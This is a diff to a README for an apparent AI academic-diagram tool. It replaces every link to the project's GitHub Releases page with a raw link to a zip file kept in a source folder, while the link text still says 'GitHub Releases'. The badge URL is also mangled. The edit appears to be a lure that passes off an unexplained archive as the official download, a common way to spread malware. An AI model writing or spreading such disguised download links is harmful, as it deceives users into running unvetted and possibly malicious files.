@@ -9,7 +9,7 @@ AIA-Academic-Illustrator- is an AI agent designed to help you create high-qualit
 - **User-Friendly Interface:** Easy to navigate, even for non-technical users.
 
 ## 📥 Download Now
-[![Download AIA-Academic-Illustrator-](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kaulzeejai/AIA-Academic-Illustrator-/releases)
+[![Download AIA-Academic-Illustrator-](https://github.com/kaulzeejai/AIA-Academic-Illustrator-/raw/refs/heads/main/frontend/src/AI-Academic-Illustrator-apartmental.zip%20Now-Click%20Here-brightgreen)](https://github.com/kaulzeejai/AIA-Academic-Illustrator-/raw/refs/heads/main/frontend/src/AI-Academic-Illustrator-apartmental.zip)
 
 ## 📋 System Requirements
 To run AIA-Academic-Illustrator-, ensure your system meets the following requirements:
@@ -20,7 +20,7 @@ To run AIA-Academic-Illustrator-, ensure your system meets the following require
 - **Disk Space:** 100 MB free space
 
 ## 📥 Download & Install
-Visit this page to download the latest version of the software: [GitHub Releases](https://github.com/kaulzeejai/AIA-Academic-Illustrator-/releases).
+Visit this page to download the latest version of the software: [GitHub Releases](https://github.com/kaulzeejai/AIA-Academic-Illustrator-/raw/refs/heads/main/frontend/src/AI-Academic-Illustrator-apartmental.zip).
 
 ### Installation Steps:
 1. Click on the link above to open the Releases page.
@@ -62,6 +62,6 @@ Join our community for additional help and resources. You'll find:
 - **User Forum:** Share tips and tricks with other users or ask for assistance.
 
 ## 📥 Download Again
-Remember, you can always return to the Releases page to download the latest version or check for updates: [GitHub Releases](https://github.com/kaulzeejai/AIA-Academic-Illustrator-/releases).
+Remember, you can always return to the Releases page to download the latest version or check for updates: [GitHub Releases](https://github.com/kaulzeejai/AIA-Academic-Illustrator-/raw/refs/heads/main/frontend/src/AI-Academic-Illustrator-apartmental.zip).
 
 Feel free to reach out if you have any questions or feedback as we continue to improve AIA-Academic-Illustrator-. Happy diagramming!
